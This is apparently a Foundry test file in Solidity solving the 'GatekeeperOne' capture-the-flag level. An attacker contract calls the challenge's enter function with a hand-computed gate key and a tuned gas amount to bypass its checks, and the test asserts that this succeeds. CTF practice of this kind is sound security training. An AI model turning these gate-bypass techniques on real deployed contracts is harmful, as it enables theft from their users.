// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/13-GatekeeperOne.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne public gatekeeperOneCTF;
    GatekeeperOneAttacker public gatekeeperOneAttacker;

    function setUp() public {
        gatekeeperOneCTF = new GatekeeperOne();
        gatekeeperOneAttacker = new GatekeeperOneAttacker(gatekeeperOneCTF);
    }

    function testAttack() public {
        // tx.origin addr i.e. forge test GatekeeperOneTest --sender 0xE659256acc9cF3927CEb1aBeeb03Aabe045e9d74
        address attacker = 0xE659256acc9cF3927CEb1aBeeb03Aabe045e9d74;
        
        assertEq(gatekeeperOneCTF.entrant(), address(0x0));

        // attack
        gatekeeperOneAttacker.attack();

        assertEq(gatekeeperOneCTF.entrant(), attacker);
    }
}

contract GatekeeperOneAttacker {
    GatekeeperOne public gatekeeperOneCTF;

    constructor(GatekeeperOne _gatekeeperOneCTF) {
        gatekeeperOneCTF = _gatekeeperOneCTF;
    }

    function attack() public {
        // TODO: calculate from foundry
        bytes8 gateKey = 0x1000000000009d74; // uint16(uint160(address(this)))
        uint256 gas = 65_796; // calculated with remix debugger

        address(gatekeeperOneCTF).call{gas: gas}(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
    }
}
